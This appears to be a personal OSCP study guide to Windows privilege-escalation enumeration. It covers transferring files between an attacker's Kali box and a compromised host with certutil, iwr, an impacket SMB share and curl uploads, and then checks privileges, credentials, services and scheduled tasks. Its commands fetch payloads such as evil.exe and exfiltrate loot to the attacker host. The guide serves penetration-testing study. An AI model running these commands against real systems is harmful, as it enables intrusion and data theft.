# Windows Enumeration 

I will do **Manual Enumeration** before running WinPEAS. 

Now repeat that five times.

Many OSCP boxes are designed in a way where WinPEAS will not pick the PE up. But still run it once you are done with the checks below.

I assumed you got some kind of shell on a Windows host. If it is a shell from a webshell, try upgrading to a more stable shell by popping one with nc.exe (which you need to transfer from your kali) or a msfvenom payload.

## How to transfer files from Kali to Windows

Navigate to your tools folders and run the following (I like port 80 since it is highly likely that the target box will not have port 80 blocked)

```bash
python -m http.server 80
```

Back on your target box, navigate to a folder that you should have write and execute access.

I like using C:\Users\Public or if you land a shell as a user, you can use that user's directory.

```cmd
certutil.exe -urlcache -split -f http://<kali ip>/<file you want to transfer> <outputfilename>
```

The powershell equivalent is:

```powershell
iwr -uri http://<kali ip>:<port>/<file> -OutFile <outfile name>
```

Another fun way of doing it creating a smbshare on kali and then mounting it. This allows for bidrectional data transfers so you can exfiltrate files out of the target.

```bash
# on your kali
# your share name can be anything you like. If you want the cwd to be the share path, you can just put . I usually set up with a username and password as sometimes Windows does not allow you to mount an authentication-less share

impacket-smbserver -smb2support <share name> <local share path> -username kali -password kali

# example. This creates a share called exfil with the path being the directory where impacket-smbserver is being run

impacket-smbserver -smb2support exfil . -username kali -password kali

```

On your windows machine

```cmd
# mounts your exfil share on y drive and pass in kali:kali credentials

net use y: \\<kali ip>\exfil kali /user:kali
```
now you can copy files to and fro
```cmd
#copy loot.txt from target to your kali

copy loot.txt \\<kali ip>\exfil\loot.txt
```
copy evil.exe from kali to your target
```cmd
copy \\<kali ip>\exfil\evil.exe evil.exe
```

## Transferring files from Windows to Kali

If you need to upload a file back to your Kali machine, you can either opt for the SMB method above or use a python [upload server](https://pypi.org/project/uploadserver/) (requires python 3.9 and above).
It also has a GUI interface if you browse to the page

Install on your Kali machine using
```bash
pip install uploadserver
```

Depending on how python is configured on your machine, you might need to use `python3` instead
```bash
python -m uploadserver
```

The default port for uploadserver is 8000, but it can be set in the same manner as http.server by indicating the port number :
```bash
python -m uploadserver 4444
```

Upload with curl using the compromised machine (can also be used in Linux)
```powershell
curl -X POST http://192.168.100.200:8000/upload -F 'files=@suspicious_file.txt'
```

The file will be uploaded to the directory where you ran the `uploadserver` module
## Checking for the Quick Wins

Check the following:

1) Privileges and groups for your current user

- If SeImpersonatePrivilege is there, thank your lucky stars. Check the system arch with systeminfo and then upload the relevant potato exploit to elevate

- If SeShutDownPrivilege is there, note it down. Your PE path may involve service or scheduled task manipulation.

- Dont worry if it says disabled. The more important thing is that the Privilege is there.

- For groups, you are checking for any non default windows groups. Could be something like HelpDesk. Note things like 'Remote Management Users' (WinRM), 'Remote Desktop Users' (RDP) or the easy win 'Backup Operators'.

- If your user is part of 'BackUp Operators', your user can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer.

```cmd
whoami /priv

whoami /groups
```

2) Environment Variables. Sometimes there are hardcoded stuff like creds in your env so give it a quick check

```cmd
SET
```

3) Systeminfo

- Check the OS version and note the patches. If it looks ancient like Windows 7 or Windows Server 2012 or earlier, a kernel exploit like EternalBlue might be the solution. That said, I wont expect to see this in OSCP though you may see it for PG boxes. 

```cmd
systeminfo
```

4) Check the C:\Users directory. This helps you enumerate users and see (or not see) what access you have to their folders as the current user. 

- Note down any files that look out of place and exfiltrate them if required.

```cmd

cd C:\Users

tree /f /a  #this lists the current path in a recursive manner and also reveals hidden files and directories. This is a GREAT command. use this often

```

5) Now check the C:\ root directory. See anything that is NOT Users,Windows,Program Files, Program Files (x86)? *P.S you can safely ignore output.txt. That seems to be some kind of logging for OffSec boxes*

- If there is, investigate the folder. Are there files inside? Can you write into that folder? Can you edit the files? Can you see the contents of the files?

6) If there is a webserver on the host, can you find the root of that webserver and check for config files? 

7) Are there local services? *You can ignore port 53 if you see it* If there are, note it down. If it looks interesting, transfer a ligolo agent and set it up for you to access the local service. 

```cmd
netstat -ano

# On Powershell

Get-Process <PID of interest from the netstat>

```

8) Check for Scheduled Tasks

Not always effective because your current user may not have permissions to view higher access level scheduled tasks so this may not return anything useful. Still no harm taking a quick look at it

```cmd
schtasks /query /fo LIST /v
```

This will output a lot of things. But the relevant stuff will be right at the top. The rest are default stuff. If you dont see anything interesting, it may be that there is nothing there or there is something there that is being run by a higher-priv user and you just dont have the rights to see it.

9) Check for unquoted Service Paths

We can use this when we can write to a service's main or subdirectory but cannot replace files

- Each service maps to an exe file that will be run when the service is started

- the vulnerability lies in paths to the exe where there is one or more spaces and is not enclosed within quotes

- When a service is started and a process is created, the CreateProcess function is used.  The function starts interpreting the path from left to right until it reaches a space and then it appends .exe and the rest is treated as arguments

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# if you find any services that dont look like default services (you need to do more boxes and then you will know what is not normal)
# check if our current user can start, stop or restart the service (might still throw an error when the command works)

Start-Service SusService

Stop-Service SusService

Restart-Service SusService
```

Well that is about it. If there is nothing so far, it is likely to be related to services or scheduled tasks or some sensitive file buried in the filesystem which winpeas can do for you.
